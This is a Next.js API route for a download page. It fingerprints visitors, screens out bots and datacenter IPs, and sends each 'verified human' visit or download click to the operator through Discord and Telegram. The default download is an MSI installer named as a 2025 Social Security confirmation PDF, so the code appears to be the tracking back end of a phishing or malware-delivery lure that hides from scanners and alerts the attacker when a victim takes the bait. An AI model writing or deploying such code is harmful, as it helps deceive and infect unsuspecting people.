import { NextRequest, NextResponse } from 'next/server';
import { checkIP, formatSecurityMessage, SecurityCheckResult } from '@/lib/ipCheck';
import { checkUserAgentForBot, isDatacenterASN } from '@/lib/serverAntiBot';

interface TrackingData {
    event: string;
    userAgent?: string;
    screenResolution?: string;
    language?: string;
    platform?: string;
    timestamp?: string;
    referrer?: string;
    threatScore?: number;
}

export async function POST(request: NextRequest) {
    try {
        const text = await request.text();
        if (!text) {
            return NextResponse.json({ success: false, error: 'Empty request body' }, { status: 400 });
        }
        
        let data: TrackingData;
        try {
            data = JSON.parse(text);
        } catch (parseError) {
            return NextResponse.json({ success: false, error: 'Invalid JSON' }, { status: 400 });
        }

        const ip =
            request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
            request.headers.get('x-real-ip') ||
            'Unknown';

        const userAgent = request.headers.get('user-agent') || '';
        const uaCheck = checkUserAgentForBot(userAgent);
        
        if (uaCheck.isBot) {
            console.log(`[Track] Bot detected: ${ip}, type: ${uaCheck.botType}`);
        }

        console.log(`[Visit] 📅 Time: ${data.timestamp || new Date().toISOString()}`);
        console.log(`[Visit] 🌐 IP: ${ip}`);
        console.log(`[Visit] 💻 User Agent: ${userAgent}`);
        console.log(`[Visit] 📱 Platform: ${data.platform || 'Unknown'}`);
        console.log(`[Visit] 🖥️ Screen: ${data.screenResolution || 'Unknown'}`);
        console.log(`[Visit] 🌍 Language: ${data.language || 'Unknown'}`);
        console.log(`[Visit] 🔗 Referrer: ${data.referrer || 'Direct'}`);
        console.log(`[Visit] 🔔 Event: ${data.event}`);

        let securityCheck: SecurityCheckResult | null = null;
        
        if (ip !== 'Unknown' && ip !== '127.0.0.1' && ip !== 'localhost') {
            const apiKey = process.env.IPAPI_API_KEY;
            securityCheck = await checkIP(ip, apiKey);
        }

        const notifyEvents = ['Page Visit - Verified Human', 'Manual Download Click'];
        
        if (notifyEvents.includes(data.event)) {
            const message = formatMessage(data, ip, securityCheck);

            const promises = [];

            if (process.env.DISCORD_WEBHOOK_URL) {
                promises.push(sendToDiscord(message));
            }

            if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
                promises.push(sendToTelegram(message));
            }

            await Promise.allSettled(promises);
        }

        return NextResponse.json({ 
            success: true,
            security: securityCheck ? {
                isSafe: securityCheck.isSafe,
                checks: securityCheck.checks
            } : null
        });
    } catch (error) {
        console.error('Tracking error:', error);
        return NextResponse.json({ success: false, error: 'Internal server error' }, { status: 500 });
    }
}

function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
    const fileName = process.env.DOWNLOAD_FILE_PATH || '2025-ssa-confirmationpdf.msi';
    
    let headerText = `🔔 Your ${fileName} has started downloading`;
    if (data.event === 'Manual Download Click') {
        headerText = `🔔 Manual download of ${fileName} clicked`;
    }
    
    let message = `${headerText}\n\n`;
    
    if (security) {
        const statusIcon = security.isSafe ? '✅' : '🚨';
        const statusText = security.isSafe ? 'CLEAN' : 'FLAGGED';
        message += `🔒 Status: ${statusIcon} ${statusText}\n`;
        
        if (security.location) {
            message += `🌍 Location: ${security.location.city}, ${security.location.country} (${security.location.countryCode})\n`;
        }
        
        const isp = security.asn?.org || security.company?.name || 'Unknown';
        message += `📡 ISP: ${isp}\n`;
        
        if (security.asn) {
            message += `🔢 ASN: AS${security.asn.number}\n`;
        }
    }
    
    message += `\n📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
    message += `🌐 IP: ${ip}\n`;
    message += `💻 User Agent: ${data.userAgent || 'Unknown'}\n`;
    message += `📱 Platform: ${data.platform || 'Unknown'}\n`;
    message += `🖥️ Screen: ${data.screenResolution || 'Unknown'}\n`;
    message += `🌍 Language: ${data.language || 'Unknown'}\n`;
    message += `🔗 Referrer: ${data.referrer || 'Direct'}`;

    return message;
}

async function sendToDiscord(message: string) {
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) return;

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: message,
            }),
        });
    } catch (error) {
        console.error('Discord webhook error:', error);
    }
}

async function sendToTelegram(message: string) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    console.log(`[Telegram] Token exists: ${!!token}, ChatId exists: ${!!chatId}`);
    
    if (!token || !chatId) {
        console.log('[Telegram] Missing credentials, skipping notification');
        return;
    }

    try {
        const plainMessage = message.replace(/\*\*/g, '').replace(/\*/g, '');
        
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: plainMessage,
            }),
        });
        const result = await response.json();
        console.log(`[Telegram] Response:`, result.ok ? 'Success' : result.description);
    } catch (error) {
        console.error('[Telegram] API error:', error);
    }
}
